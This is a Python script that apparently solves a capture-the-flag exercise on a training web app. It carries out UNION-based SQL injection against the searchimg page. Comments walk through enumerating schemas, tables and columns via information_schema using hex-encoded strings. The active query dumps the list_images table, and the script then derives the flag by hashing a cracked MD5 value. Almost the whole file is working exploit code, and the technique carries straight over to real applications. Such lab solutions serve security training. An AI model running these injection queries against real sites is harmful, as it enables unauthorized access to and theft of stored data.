#!/usr/bin/env python3
# PAGE: /?page=searchimg
# VULNERABILITY: SQL Injection via UNION SELECT
# REQUIRES: pip install beautifulsoup4 requests

import requests
from bs4 import BeautifulSoup
import sys
import hashlib

to_hex = lambda x="": f"0x{x.encode('utf-8').hex()}"

HOST_IP = "10.11.249.19"

# --- ENUMERATION WALKTHROUGH (already done, kept for reference) ---
# STEP 1: schemas
# query = "1 UNION SELECT NULL, GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata;--"
# result: |information_schema|,|Member_Brute_Force|,|Member_Sql_Injection|,|Member_guestbook|,|Member_images|,|Member_survey|

# STEP 2: tables in Member_images
# schema = to_hex("Member_images")
# query = f"1 UNION SELECT NULL, GROUP_CONCAT(0x7c,table_name,0x7c) FROM information_schema.tables WHERE table_schema={schema}"
# result: |list_images|

# STEP 3: columns in list_images
# table = to_hex("list_images")
# query = f"1 UNION SELECT NULL, GROUP_CONCAT(0x7c,column_name,0x7c) FROM information_schema.columns WHERE table_name={table}"
# result: |id|,|url|,|title|,|comment|

# STEP 4: dump list_images — result has id:5 with MD5 in comment: 1928e8083cf461a51303633093573c46
# 1928e8083cf461a51303633093573c46 (MD5) -> "albatroz" -> lowercase -> sha256 -> flag

# --- ACTIVE QUERY ---
dquote = to_hex('"')
query = (
    "1 UNION SELECT NULL, GROUP_CONCAT("
    + to_hex("(") + ","
    + to_hex('"id: ') + ",id," + dquote + ","
    + to_hex(',"url: ') + ",url," + dquote + ","
    + to_hex(',"title: ') + ",title," + dquote + ","
    + to_hex(',"comment: ') + ",comment," + dquote + ","
    + to_hex(")")
    + ") FROM Member_images.list_images"
)

response = requests.get(f'http://{HOST_IP}/', params={"page": "searchimg", "Submit": "Submit", "id": query})
soup = BeautifulSoup(response.text, 'html.parser')
content = soup.find("div", {"class": "container"})

if content is None:
    print("No content found")
    exit(1)

extra_table = content.find("table")
if extra_table is not None:
    extra_table.decompose()
else:
    print("No extra table found")
    print(content.prettify())
    exit(1)

results = content.find_all("pre")
if len(results) == 0:
    print("No results found")
    exit(1)

formatted_results = []
for item in results:
    info = list(item.stripped_strings)
    formatted_results.append((
        info[1].replace("First name: ", ""),
        info[2].replace("Surname :", ""),
    ))

max_size = max(max(len(j) for j in i) for i in formatted_results)
beautify = "--clean" not in sys.argv

if beautify:
    for i, item in enumerate(formatted_results):
        prefix = f"[{i + 1}]:"
        pad = max(0, 69 - max_size - len(prefix))
        print(f"{prefix}{' ' * (pad + 1)}|{item[1]}|")
else:
    for item in formatted_results:
        print(item[1])

# FLAG DERIVATION:
# 1928e8083cf461a51303633093573c46 (MD5) -> "albatroz"
# lowercase -> sha256 -> flag
decrypted_md5 = "albatroz"
sha256_hash = hashlib.sha256(decrypted_md5.lower().encode()).hexdigest()
print(f"\n[FLAG] sha256('{decrypted_md5}') = {sha256_hash}")
